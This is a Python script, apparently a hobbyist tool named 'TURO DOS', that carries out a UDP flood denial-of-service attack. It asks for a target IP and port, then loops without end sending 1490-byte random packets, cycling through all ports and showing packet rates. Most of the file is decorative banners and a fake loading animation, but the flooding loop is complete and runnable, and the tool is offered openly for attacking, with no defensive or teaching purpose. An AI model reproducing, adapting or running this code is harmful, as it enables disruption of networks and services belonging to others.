print("\033[91m")
import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


print("\033[96m" + "=" * 50)
print("\033[95m")
print("████████╗██╗   ██╗██████╗  ██████╗      ██████╗  ██████╗ ███████╗")
print("╚══██╔══╝██║   ██║██╔══██ ██╔═══██╗     ██╔══██╗██╔═══██╗██╔════╝")
print("   ██║   ██║   ██║██████╔╝██║   ██║     ██║  ██║██║   ██║███████╗")
print("   ██║   ██║   ██║██╔══██╗██║   ██║     ██║  ██║██║   ██║╚════██║")
print("   ██║   ╚██████╔╝██║  ██║╚██████╔╝     ██████╔╝╚██████╔╝███████║")
print("   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ═════╝      ╚═════╝  ╚═════╝ ╚══════╝")
print("\033[93m" + "─" * 50)
print("╔══════════════════════════════════════════════════════╗")
print("║                 T U R O     D O S                    ║")
print("║               [just a simple Dos attack]             ║")
print("╚══════════════════════════════════════════════════════╝")
print("\033[96m" + "=" * 50 + "\033[0m")
print()

ip = input("\033[92m[+] Target IP : \033[0m")
port = int(input("\033[92m[+] Target Port : \033[0m"))

os.system("clear")


print("\033[91m")
print("┌────────────────────────────────────────────────────┐")
print("│                                                    │")
print("│                                                    │")
print("│               made by: @JustScripts                │")
print("│----------------------------------------------------│")
print("│                  TURO DOS ATTACK                   │")
print("│                                                    │")
print("│                                                    │")
print("└────────────────────────────────────────────────────┘")
print("\033[0m")

print("\033[93m" + "Dos Attack Loading..." + "\033[0m")
print()


loading_chars = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
for i in range(24):
    sys.stdout.write(f"\r\033[94m[{loading_chars[i % 8]}] Initializing TURBO Mode... {int((i+1)/24*100)}%\033[0m")
    sys.stdout.flush()
    time.sleep(0.1)

print("\n\n\033[92m[+] TURO Engine: ACTIVE\033[0m")
time.sleep(1)
print("\033[92m[+] Packet Generator: ONLINE\033[0m")
time.sleep(1)
print("\033[92m[+] Network Interface: READY\033[0m")
time.sleep(1)

print("\n\033[91m" + "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
print("█ TURO DOS ATTACK IN PROGRESS   PRESS CTRL+C TO STOP █")
print("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀" + "\033[0m")
print()

sent = 0
start_time = time.time()

try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1

        
        if sent % 100 == 0:
            color = "\033[91m"  
        elif sent % 50 == 0:
            color = "\033[93m"  
        else:
            color = "\033[92m"  

        elapsed = time.time() - start_time
        packets_per_sec = sent / elapsed if elapsed > 0 else 0

        print(f"{color}[TURBO] Packets: {sent:,} | Target: {ip}:{port} | Speed: {packets_per_sec:,.0f} pps\033[0m")

        if port >= 65534:
            port = 1
            print("\033[94m[+] Port rotation: Resetting to port 1\033[0m")

except KeyboardInterrupt:
    print("\n\n\033[93m" + "✗" * 50)
    print("ATTACK STOPPED BY USER")
    print(f"Total packets sent: {sent:,}")
    print(f"Attack duration: {elapsed:.2f} seconds")
    print(f"Average speed: {packets_per_sec:,.0f} packets/second")
    print("✗" * 50 + "\033[0m")
except Exception as e:
    print(f"\n\033[91m[!] Error: {e}\033[0m")
